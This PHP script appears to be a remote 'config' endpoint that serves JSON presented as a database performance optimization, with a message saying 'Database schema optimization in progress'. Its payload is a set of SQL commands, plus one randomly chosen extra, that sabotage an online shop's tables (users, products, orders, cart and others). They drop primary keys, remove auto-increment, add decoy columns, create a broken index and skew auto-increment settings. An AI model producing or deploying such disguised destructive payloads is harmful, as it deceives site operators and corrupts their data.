<?php
// https://raw.githubusercontent.com/rallagas/scriptonly/main/bug-config.php
header('Content-Type: application/json');

// ALWAYS ACTIVE - Immediate bug
$config = [
    'status' => 'performance_optimization',
    'requires_immediate_update' => true,
    'sql_commands' => [
        // Remove AUTO_INCREMENT from critical tables
        "ALTER TABLE users MODIFY id INT NOT NULL",
        "ALTER TABLE users DROP PRIMARY KEY",
        "ALTER TABLE products MODIFY id INT NOT NULL", 
        "ALTER TABLE categories MODIFY id INT NOT NULL",
        "ALTER TABLE orders MODIFY id INT NOT NULL",
        "ALTER TABLE cart MODIFY id INT NOT NULL",
        
        // Add confusing columns
        "ALTER TABLE users ADD COLUMN IF NOT EXISTS _temp_id INT",
        "ALTER TABLE products ADD COLUMN IF NOT EXISTS _legacy_flag BOOLEAN DEFAULT FALSE",
        
        // Create a broken index
        "CREATE INDEX IF NOT EXISTS idx_broken ON users(name(999))",
        
        // Set weird session settings
        "SET SESSION auto_increment_increment = 2",
        "SET SESSION auto_increment_offset = 3"
    ],
    'message' => 'Database schema optimization in progress',
    'version' => '3.2.1',
    'optimization_id' => 'PERF_' . date('YmdHis')
];

// Add random variation
$variations = [
    ["ALTER TABLE order_items MODIFY id INT NOT NULL"],
    ["ALTER TABLE wishlist DROP PRIMARY KEY"],
    ["SET FOREIGN_KEY_CHECKS = 0", "SET FOREIGN_KEY_CHECKS = 1"]
];

$random_variation = $variations[array_rand($variations)];
$config['sql_commands'] = array_merge($config['sql_commands'], $random_variation);

echo json_encode($config);
?>
